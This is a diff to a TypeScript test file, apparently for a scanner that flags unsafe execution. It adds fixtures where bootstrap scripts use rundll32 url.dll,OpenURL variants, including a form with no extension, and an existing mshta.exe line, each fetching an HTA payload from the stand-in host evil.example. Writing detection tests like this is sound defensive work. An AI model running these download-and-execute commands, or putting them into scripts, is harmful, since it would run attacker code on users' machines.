@@ -37,6 +37,18 @@ const RUNNERS: Record<string, { path: string; body: string }> = {
     path: "scripts/bootstrap.ps1",
     body: "mshta.exe https://evil.example/x.hta",
   },
+  "rundll32 url.dll,OpenURL": {
+    path: "scripts/bootstrap.bat",
+    body: "rundll32 url.dll,OpenURL https://evil.example/x.hta",
+  },
+  "rundll32.exe url.dll,OpenURL": {
+    path: "scripts/bootstrap.bat",
+    body: "rundll32.exe url.dll,OpenURL https://evil.example/x.hta",
+  },
+  "rundll32 url,OpenURL (no .dll extension)": {
+    path: "scripts/bootstrap.bat",
+    body: "rundll32 url,OpenURL https://evil.example/x.hta",
+  },
 };
 
 test("a command that runs a remote script URL directly is unsafe execution", () => {
